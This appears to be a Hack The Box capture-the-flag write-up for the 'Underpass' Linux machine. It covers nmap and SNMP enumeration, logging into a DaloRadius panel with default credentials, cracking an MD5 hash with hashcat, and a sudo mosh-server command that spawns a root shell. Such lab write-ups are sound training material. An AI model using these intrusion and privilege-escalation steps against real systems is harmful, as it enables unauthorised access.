---
title: "HTB - Underpass"
date: 2026-05-03
draft: false
tags: ["HTB", "Linux", "Write-Up"]
cover:
    image: "/images/writeup_screens/htb_underpass/underpass_cover.png"      
    alt: "HTB CCTV Cover"
    relative: true     
ShowToc: false
---

**Box Details**

|   |   |
|---|---|
| Difficulty | Easy |
| Type | Linux |

**TCP Port Scan**
```
└─$ nmap $IP -sV -sC
Starting Nmap 7.98 ( https://nmap.org ) at 2026-05-03 00:54 +0200
Nmap scan report for 10.129.231.213
Host is up (0.061s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 48:b0:d2:c7:29:26:ae:3d:fb:b7:6b:0f:f5:4d:2a:ea (ECDSA)
|_  256 cb:61:64:b8:1b:1b:b5:ba:b8:45:86:c5:16:bb:e2:a2 (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.52 seconds
```

**UDP Port Scan**
```
└─$ nmap -sU -T5 10.129.231.213
Starting Nmap 7.98 ( https://nmap.org ) at 2026-05-03 01:28 +0200
Warning: 10.129.231.213 giving up on port because retransmission cap hit (2).
Stats: 0:00:20 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan
UDP Scan Timing: About 85.63% done; ETC: 01:28 (0:00:04 remaining)
Stats: 0:00:37 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan
UDP Scan Timing: About 96.93% done; ETC: 01:29 (0:00:01 remaining)
Nmap scan report for underpass.htb (10.129.231.213)
Host is up (0.035s latency).
Not shown: 945 open|filtered udp ports (no-response), 54 closed udp ports (port-unreach)
PORT    STATE SERVICE
161/udp open  snmp

Nmap done: 1 IP address (1 host up) scanned in 48.68 seconds
```
## User Flag

The webserver only serves a default Apache page and i was not able to find subdomains, vhosts, hidden directories or anything else. Thus I scanned the target for UDP ports and discovered that **SNMP** is open. I started to enumerate the service: 

```
$ snmp-check $IP
```

![](/images/writeup_screens/htb_underpass/htb_underpass1.png)

There seems to be a **DaloRadius** instance running on the target. I went back to the webserver and found that _/daloradius_ gives us _403 Forbidden_. I looked at the [Github Repository of DaloRadius](https://github.com/lirantal/daloradius) and found the path to the login page which is _/daloradius/app/operators/login.php_ 

![](/images/writeup_screens/htb_underpass/htb_underpass2.png)

I found the following default credentials via a Google search and was able to autenticate:

```
administrator:radius
```

I did not find an interesting vulnerabilty affecting the version _2.2_ of **DaloRadius** which is why i explored the application. We can find a user list via the homepage and only one user **svcMosh** exists. 

![](/images/writeup_screens/htb_underpass/htb_underpass3.png)

Using a [hash analyzer](https://www.tunnelsup.com/hash-analyzer/) we can quickly find out that the stored password for user **svcMosh** is a MD5 hash. Via the following hashcat command, we can retrieve the clear-text password in only a few seconds: 

```
$ hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt
```

With the cracked password we can authenticate on the machine via SSH as user **svcMosh** and read the flag at _/home/svcMosh/user.txt_


## Root Flag

With `sudo -l` we can see that our user is allowed to run the binary `/usr/bin/mosh-server` as **root** with no password. Looking at [GTFOBins](https://gtfobins.org/gtfobins/mosh-server/) we can see that `mosh-server` with _sudo_ privileges can spawn an interactive system shell. I did so with the following command: 

```
$ mosh --server='sudo mosh-server' localhost /bin/sh
```

I succesfully spawned a root shell and was able to read _/root/root.txt_